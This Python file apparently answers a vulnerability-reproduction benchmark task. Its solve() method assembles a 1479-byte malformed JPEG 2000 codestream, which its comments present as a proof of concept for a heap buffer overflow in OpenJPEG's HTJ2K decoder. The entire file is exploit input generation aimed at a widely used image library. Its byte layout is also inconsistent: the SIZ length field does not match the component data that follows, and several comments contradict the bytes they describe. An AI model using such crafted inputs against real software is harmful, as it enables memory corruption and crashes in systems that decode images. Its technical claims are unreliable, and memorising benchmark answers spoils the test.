import os
import tarfile
import tempfile
import subprocess
import struct
import math

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This is a PoC for CVE-2020-27844 (heap buffer overflow in OpenJPEG's HTJ2K decoder)
        # The vulnerability is in opj_t1_allocate_buffers() when processing malformed HTJ2K images
        # The ground truth length is 1479 bytes, so we'll create a minimal PoC around that size
        
        # Create a JPH (HTJ2K) file that triggers the vulnerability
        poc = bytearray()
        
        # Start of Codestream (SOC) - JPEG 2000 signature
        poc.extend(b'\xff\x4f')
        
        # SIZ marker - Image and tile size
        # We use values that will cause an overflow in buffer allocation calculation
        poc.extend(b'\xff\x51')  # SIZ marker
        poc.extend(b'\x00\x3a')  # Length (58 bytes)
        
        # Rsiz (capabilities) - HTJ2K
        poc.extend(b'\x00\x00')
        
        # Image size: 1x1 pixels
        poc.extend(b'\x00\x00\x00\x01')  # Xsiz
        poc.extend(b'\x00\x00\x00\x01')  # Ysiz
        poc.extend(b'\x00\x00\x00\x00')  # XOsiz
        poc.extend(b'\x00\x00\x00\x00')  # YOsiz
        
        # Tile size: also 1x1
        poc.extend(b'\x00\x00\x00\x01')  # XTsiz
        poc.extend(b'\x00\x00\x00\x01')  # YTsiz
        poc.extend(b'\x00\x00\x00\x00')  # XTOsiz
        poc.extend(b'\x00\x00\x00\x00')  # YTOsiz
        
        # Csiz: 255 components (max that fits in marker)
        # This large number of components is key to triggering the overflow
        poc.extend(b'\x00\xff')
        
        # Component parameters - each component has 255 bit depth (invalid but triggers overflow)
        for i in range(255):
            # Ssiz: 255 (bit depth 255, signed=1)
            # XRsiz: 1
            poc.extend(b'\xff\x01')
        
        # COD marker - Coding style default
        poc.extend(b'\xff\x52')  # COD marker
        poc.extend(b'\x00\x0c')  # Length (12 bytes)
        
        # Scod: 0x00 (no SOP, no EPH, HTJ2K mode)
        poc.extend(b'\x00')
        
        # SGcod: Progression order LRCP, no layers, multiple component transform
        poc.extend(b'\x00\x01\x00')
        
        # SPcod: 5 levels, code block size 64x64, precincts, kernel
        poc.extend(b'\x05\x40\x00\x00\x00\x00\x00\x09')
        
        # QCD marker - Quantization default
        poc.extend(b'\xff\x5c')  # QCD marker
        poc.extend(b'\x00\x04')  # Length (4 bytes)
        poc.extend(b'\x00\x00\x00')  # No quantization
        
        # SOT marker - Start of tile
        poc.extend(b'\xff\x90')  # SOT marker
        poc.extend(b'\x00\x0a')  # Length (10 bytes)
        
        # Tile index 0, tile length unknown (0), tile part 0, 1 tile part
        poc.extend(b'\x00\x00\x00\x00\x00\x00\x00\x00')
        
        # SOD marker - Start of data
        poc.extend(b'\xff\x93')  # SOD marker
        
        # HT Cleanup pass - minimal data to trigger allocation
        # The key is to have enough precincts/components to overflow the allocation
        
        # First create a minimal HT Cleanup header
        # ZERO block: 0 (all quads zero)
        poc.extend(b'\x00')
        
        # SIG block: 0 (no significant quads)
        poc.extend(b'\x00')
        
        # REF block: 0 (no refinement)
        poc.extend(b'\x00')
        
        # VLC prefix: minimal
        poc.extend(b'\x00')
        
        # Add padding to reach approximately 1479 bytes
        # The exact size isn't critical as long as we trigger the overflow
        current_len = len(poc)
        target_len = 1479
        
        if current_len < target_len:
            # Add some valid HT Cleanup data segments
            # Each segment: tag (2 bits) + length (variable)
            # We'll add segments that look like magnitude refinement
            for i in range((target_len - current_len) // 2):
                # Add magnitude refinement segments
                # Tag 2 (magnitude refinement) + minimal length
                poc.extend(b'\x80')  # 10000000 (tag=2, len=0)
        
        # Ensure exact length
        poc = poc[:target_len]
        
        if len(poc) < target_len:
            poc.extend(b'\x00' * (target_len - len(poc)))
        
        return bytes(poc)
